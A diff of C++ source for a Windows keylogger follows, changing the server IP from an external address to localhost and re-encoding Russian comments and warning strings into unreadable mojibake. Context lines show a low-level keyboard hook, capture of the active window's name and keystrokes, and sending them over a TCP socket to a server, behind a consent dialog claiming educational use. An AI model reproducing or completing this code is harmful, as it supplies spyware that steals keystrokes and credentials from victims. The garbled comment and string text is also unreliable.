@@ -1,9 +1,9 @@
 /*
-* ¬Ќ»ћјЌ»≈!!!
-* ƒјЌЌќ≈ ѕ–ќ√–јћћЌќ≈ ќЅ≈—ѕ≈„≈Ќ»≈
-* —ќƒ≈–∆»“ ¬ —≈Ѕ≈ ¬–≈ƒќЌќ—Ќџ… ‘”Ќ ÷»ќЌјЋ
-* » ѕ–≈ƒЌј«Ќј„≈Ќќ »— Ћё„»“≈Ћ№Ќќ ¬ ”„≈ЅЌџ’ ÷≈Ћя’.
-* ¬Ќ»ћјЌ»≈!!!
+* √В√Н√И√М√А√Н√И√Е!!!
+* √Д√А√Н√Н√О√Е √П√Р√О√Г√Р√А√М√М√Н√О√Е √О√Б√Е√С√П√Е√Ч√Е√Н√И√Е
+* √С√О√Д√Е√Р√Ж√И√Т √В √С√Е√Б√Е √В√Р√Е√Д√О√Н√О√С√Н√Ы√Й √Ф√У√Н√К√Ц√И√О√Н√А√Л
+* √И √П√Р√Е√Д√Н√А√З√Н√А√Ч√Е√Н√О √И√С√К√Л√Ю√Ч√И√Т√Е√Л√Ь√Н√О √В √У√Ч√Е√Б√Н√Ы√Х √Ц√Е√Л√Я√Х.
+* √В√Н√И√М√А√Н√И√Е!!!
 */
 #include <Windows.h>
 #pragma comment(linker,"\"/manifestdependency:type='win32' \
@@ -16,7 +16,7 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 #pragma warning  (disable : 4996)
 
 /////////////Macro for IP////////////
-#define SERVER_IP "25.45.71.203" //25.41.96.131 127.0.0.1 25.45.71.203
+#define SERVER_IP "127.0.0.1"
 /////////////Macro for IP////////////
 
 
@@ -38,7 +38,7 @@ enum class ID {
 
 void SEND(int key) {
 
-	//»м€ программы ввода
+	//√И√ђ√њ √ѓ√∞√Ѓ√£√∞√†√ђ√ђ√ї √Ґ√Ґ√Ѓ√§√†
 	char prevProg[256];
 	prevProg[255] = '\0';
 	HWND foreground = GetForegroundWindow();
@@ -64,13 +64,13 @@ void SEND(int key) {
 			msg[strlen(msg) + 1] = '\n';
 			msg[strlen(msg)] = ']';
 
-			//ќтправка имени программы
+			//√О√≤√ѓ√∞√†√Ґ√™√† √®√ђ√•√≠√® √ѓ√∞√Ѓ√£√∞√†√ђ√ђ√ї
 			send(sckt, msg, sizeof(msg), 0);
 			strcpy_s(tim, dt);
 			send(sckt, tim, sizeof(msg), 0);
 		}
 
-		//ќбработка нажатий
+		//√О√°√∞√†√°√Ѓ√≤√™√† √≠√†√¶√†√≤√®√©
 		bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
 			lower = !lower;
@@ -469,10 +469,10 @@ LRESULT CALLBACK MenuProcedure(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
 	switch (msg) {
 	case WM_CREATE: {
 		HWND Text = CreateWindow(L"Static",
-			L"¬Ќ»ћјЌ»≈!!!\nƒјЌЌќ≈ ѕ–ќ√–јћћЌќ≈ ќЅ≈—ѕ≈„≈Ќ»≈\n—ќƒ≈–∆»“ ¬ —≈Ѕ≈ ¬–≈ƒќЌќ—Ќџ… ‘”Ќ ÷»ќЌјЋ\n» ѕ–≈ƒЌј«Ќј„≈Ќќ »— Ћё„»“≈Ћ№Ќќ ¬ ”„≈ЅЌџ’ ÷≈Ћя’.\nЌј∆»ћјя  Ќќѕ ” \"я —ќ√Ћј—≈Ќ\",\n¬џ —ќ√ЋјЎј≈“≈—№ Ќј «јѕ”— \n¬–≈ƒќЌќ—Ќќ√ќ ѕќ Ќј ¬јЎ≈ћ ”—“–ќ…—“¬≈\n¬Ќ»ћјЌ»≈!!!",
+			L"√В√Н√И√М√А√Н√И√Е!!!\n√Д√А√Н√Н√О√Е √П√Р√О√Г√Р√А√М√М√Н√О√Е √О√Б√Е√С√П√Е√Ч√Е√Н√И√Е\n√С√О√Д√Е√Р√Ж√И√Т √В √С√Е√Б√Е √В√Р√Е√Д√О√Н√О√С√Н√Ы√Й √Ф√У√Н√К√Ц√И√О√Н√А√Л\n√И √П√Р√Е√Д√Н√А√З√Н√А√Ч√Е√Н√О √И√С√К√Л√Ю√Ч√И√Т√Е√Л√Ь√Н√О √В √У√Ч√Е√Б√Н√Ы√Х √Ц√Е√Л√Я√Х.\n√Н√А√Ж√И√М√А√Я √К√Н√О√П√К√У \"√Я √С√О√Г√Л√А√С√Е√Н\",\n√В√Ы √С√О√Г√Л√А√Ш√А√Е√Т√Е√С√Ь √Н√А √З√А√П√У√С√К\n√В√Р√Е√Д√О√Н√О√С√Н√О√Г√О √П√О √Н√А √В√А√Ш√Е√М √У√С√Т√Р√О√Й√С√Т√В√Е\n√В√Н√И√М√А√Н√И√Е!!!",
 			WS_VISIBLE | WS_CHILD, 50, 50, 500, 500, hWnd, reinterpret_cast<HMENU>(ID::TEXT), NULL, NULL);
 
-		HWND Button = CreateWindow(L"Button", L"я —ќ√Ћј—≈Ќ", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 200, 235, 100, 30, hWnd, reinterpret_cast<HMENU>(ID::AGREEBUTTON), NULL, NULL);
+		HWND Button = CreateWindow(L"Button", L"√Я √С√О√Г√Л√А√С√Е√Н", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 200, 235, 100, 30, hWnd, reinterpret_cast<HMENU>(ID::AGREEBUTTON), NULL, NULL);
 
 		return 0;
 	}
@@ -522,7 +522,7 @@ void Run() {
 	if (!RegisterClassW(&LoggerClass)) { exit(-1); }
 	hWND = CreateWindow(L"LoggerWindowClass", L"Logger", WS_OVERLAPPEDWINDOW, 750, 250, 500, 500, nullptr, nullptr, nullptr, nullptr);
 
-	//Ќачинаем работу с сокетом
+	//√Н√†√Ј√®√≠√†√•√ђ √∞√†√°√Ѓ√≤√≥ √± √±√Ѓ√™√•√≤√Ѓ√ђ
 	WSAStartup(MAKEWORD(2, 2), &ws);
 	sckt = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -534,7 +534,7 @@ void Run() {
 	connect(sckt, (sockaddr*)&scktin, sizeof(scktin));
 
 
-	//—оздаем хук
+	//√С√Ѓ√І√§√†√•√ђ √µ√≥√™
 	hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, nullptr, 0);
 
 	MSG LoggerMessage = { 0 };
